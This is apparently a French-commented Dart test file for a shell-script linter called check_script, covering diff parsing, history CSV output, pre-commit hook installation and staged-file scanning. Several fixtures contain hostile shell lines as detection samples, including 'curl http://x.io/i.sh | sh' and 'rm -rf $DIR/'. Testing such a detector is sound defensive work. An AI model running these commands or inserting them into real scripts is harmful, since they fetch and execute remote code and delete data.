import 'dart:io';

import 'package:check_script/check_script.dart';
import 'package:test/test.dart';

import '../bin/check_script.dart' as cli;
import 'cli_test.dart' show Capture;
import 'v080_test.dart' show GitOnly;

void main() {
  group('lignes modifiées (git diff -U0)', () {
    test('plages, ajouts et suppressions', () {
      const diff = '''
diff --git a/a.sh b/a.sh
--- a/a.sh
+++ b/a.sh
@@ -2 +2 @@ x
-old
+new
@@ -5,0 +6,3 @@
+a
+b
+c
@@ -9,2 +11,0 @@
-gone
-gone
diff --git a/b.sh b/b.sh
--- /dev/null
+++ b/b.sh
@@ -0,0 +1,2 @@
+x
+y
''';
      final r = parseChangedLines(diff, '/r');
      expect(r['/r/a.sh'], {2, 6, 7, 8});
      expect(r['/r/b.sh'], {1, 2});
    });
  });

  group('historique', () {
    final e1 = HistoryEntry(DateTime(2026, 1, 1), 5, 2, {'A': 1, 'E': 1},
        {'a.sh': 9.0, 'b,c.sh': 1.0});
    final e2 = HistoryEntry(
        DateTime(2026, 2, 1), 7.5, 2, {'A': 2}, {'a.sh': 8.0, 'b,c.sh': 7.0});

    test('CSV par analyse', () {
      expect(historyCsv([e1, e2]).trim().split('\n'), [
        'date,average,scripts,A,B,C,D,E',
        '2026-01-01T00:00:00.000,5.0,2,1,0,0,0,1',
        '2026-02-01T00:00:00.000,7.5,2,2,0,0,0,0',
      ]);
    });

    test('CSV par script : noms protégés', () {
      final lines = historyScriptsCsv([e1]).trim().split('\n');
      expect(lines[0], 'date,script,score');
      expect(lines, contains('2026-01-01T00:00:00.000,"b,c.sh",1.0'));
    });

    test('évolution : plus fort recul d\'abord', () {
      final c = scoreChanges([e1, e2]);
      expect(c.map((x) => x.$1), ['a.sh', 'b,c.sh']);
      expect(c.first.$3 - c.first.$2, -1);
      expect(scoreChanges([e1]), isEmpty);
    });
  });

  group('hook pre-commit', () {
    test('contenu : seuil, repère, variables', () {
      final h = preCommitHook(failUnder: '7.5');
      expect(h, startsWith('#!/bin/sh'));
      expect(h, contains('--staged'));
      expect(h, contains('--fail-under 7.5'));
      expect(isCheckScriptHook(h), isTrue);
      expect(isCheckScriptHook('#!/bin/sh\nexit 0\n'), isFalse);
    });
  });

  group('dépôt git', () {
    late Directory repo;
    Future<void> git(List<String> args) async {
      final r = await Process.run('git', ['-C', repo.path, ...args]);
      expect(r.exitCode, 0, reason: '${r.stderr}');
    }

    void write(String name, String content) =>
        File('${repo.path}/$name').writeAsStringSync(content);

    Future<(int, String)> run(List<String> args) async {
      final out = Capture(), err = Capture();
      // Langue fixée : sinon elle dépend de LANG (anglais en CI).
      // Une sous-commande doit rester le premier argument.
      final sub = args.isNotEmpty &&
          const {'install-hook', 'history'}.contains(args.first);
      final code = await cli.run(
          sub ? [...args, '--lang', 'fr'] : ['--lang', 'fr', ...args],
          out: out.sink,
          err: err.sink,
          runner: GitOnly());
      return (code, '${await out.text()}${await err.text()}');
    }

    setUp(() async {
      repo = await Directory.systemTemp.createTemp('cs_wf_');
      await git(['init', '-q']);
      await git(['config', 'user.email', 't@example.com']);
      await git(['config', 'user.name', 'Test']);
      write('ok.sh', '#!/bin/sh\necho ok\n');
      await git(['add', '.']);
      await git(['commit', '-qm', 'init']);
    });
    tearDown(() => repo.delete(recursive: true));

    test('--staged : version indexée seulement', () async {
      write('bad.sh', '#!/bin/bash\ncurl http://x.io/i.sh | sh\n');
      write('later.pl', 'system("rm \$x");\n');
      await git(['add', 'bad.sh']);
      // Modifié après l'indexation : la version de l'index prime.
      write('bad.sh', '#!/bin/sh\necho propre\n');
      final (_, out) = await run(['--staged', '--summary', repo.path]);
      expect(out, contains('bad.sh'));
      expect(out, isNot(contains('later.pl')));
      expect(out, isNot(contains('ok.sh')));
      expect(out, contains('SEC001'));
    });

    test('--staged : rien d\'indexé, ou seulement du non-script', () async {
      var (code, out) = await run(['--staged', repo.path]);
      expect(code, 0);
      expect(out, contains('Aucun script indexé'));
      write('notes.txt', 'x\n');
      await git(['add', 'notes.txt']);
      (code, out) = await run(['--staged', repo.path]);
      expect(code, 0);
    });

    test('--staged : seuil de note', () async {
      write('bad.sh', '#!/bin/bash\nrm -rf \$DIR/\ncurl http://x | sh\n');
      await git(['add', 'bad.sh']);
      expect((await run(['--staged', '--fail-under', '9', repo.path])).$1, 1);
      expect((await run(['--staged', '--fail-under', '1', repo.path])).$1, 0);
    });

    test('--staged : options incompatibles', () async {
      expect((await run(['--staged', '--fix', repo.path])).$1, 2);
      expect((await run(['--staged', 'a', 'b'])).$1, 2);
      expect((await run(['--staged', '/nonexistent-cs'])).$1, 2);
    });

    test('--changed-lines : seulement le nouveau code', () async {
      write('ok.sh', '#!/bin/sh\nrm -rf \$DIR/\n');
      await git(['commit', '-qam', 'ancien']);
      write('ok.sh', '#!/bin/sh\nrm -rf \$DIR/\ncurl http://x | sh\n');
      final (_, all) = await run(
          ['--changed-since', 'HEAD', '--details', '--no-color', repo.path]);
      expect(all, contains('SEC007'));
      final (_, onlyNew) = await run([
        '--changed-since',
        'HEAD',
        '--changed-lines',
        '--details',
        '--no-color',
        repo.path
      ]);
      expect(onlyNew, contains('SEC001'));
      expect(onlyNew, isNot(contains('SEC007')));
      expect((await run(['--changed-lines', repo.path])).$1, 2);
    });

    test('install-hook : installe, régénère, refuse un autre hook, retire',
        () async {
      final hook = File('${repo.path}/.git/hooks/pre-commit');
      var (code, out) =
          await run(['install-hook', '--fail-under', '8', repo.path]);
      expect(code, 0);
      expect(out, contains('Hook installé'));
      expect(hook.readAsStringSync(), contains('--fail-under 8'));
      expect(hook.statSync().mode & 0x40, isNot(0)); // exécutable
      // Régénéré sans --force : c'est son propre hook.
      (code, out) = await run(['install-hook', '--fail-under', '5', repo.path]);
      expect(code, 0);
      expect(hook.readAsStringSync(), contains('--fail-under 5'));
      // Autre hook : refusé, puis forcé.
      hook.writeAsStringSync('#!/bin/sh\necho mien\n');
      (code, out) = await run(['install-hook', repo.path]);
      expect(code, 2);
      expect(hook.readAsStringSync(), contains('mien'));
      expect((await run(['install-hook', '--uninstall', repo.path])).$1, 2);
      expect((await run(['install-hook', '--force', repo.path])).$1, 0);
      expect(isCheckScriptHook(hook.readAsStringSync()), isTrue);
      (code, out) = await run(['install-hook', '--uninstall', repo.path]);
      expect(code, 0);
      expect(hook.existsSync(), isFalse);
    });

    test('install-hook : note invalide, pas un dépôt, --stdout', () async {
      expect(
          (await run(['install-hook', '--fail-under', '12', repo.path])).$1, 2);
      final plain = await Directory.systemTemp.createTemp('cs_nogit_');
      addTearDown(() => plain.delete(recursive: true));
      expect((await run(['install-hook', plain.path])).$1, 3);
      final (code, out) = await run(['install-hook', '--stdout']);
      expect(code, 0);
      expect(out, startsWith('#!/bin/sh'));
    });

    test('history : tableau, CSV et dossier sans historique', () async {
      final store = Directory('${repo.path}/.hist')..createSync();
      final h = FolderHistory(store);
      final dir = repo.path;
      await h.append(dir,
          HistoryEntry(DateTime(2026, 1, 1), 5, 1, {'E': 1}, {'ok.sh': 2.0}));
      await h.append(dir,
          HistoryEntry(DateTime(2026, 2, 1), 9, 1, {'A': 1}, {'ok.sh': 9.0}));
      var (code, out) =
          await run(['history', '--history-dir', store.path, dir]);
      expect(code, 0);
      expect(out, contains('5,0 → 9,0'));
      expect(out, contains('ok.sh'));
      (code, out) = await run([
        'history',
        '--history-dir',
        store.path,
        '--csv',
        '--last',
        '1',
        dir
      ]);
      expect(out.trim().split('\n'), hasLength(2));
      (code, out) = await run(
          ['history', '--history-dir', store.path, '--csv', '--scripts', dir]);
      expect(out, contains('date,script,score'));
      expect(
          (await run(['history', '--history-dir', store.path, '/inconnu'])).$1,
          3);
      expect((await run(['history', '--last', '0', dir])).$1, 2);
    });
  });
}
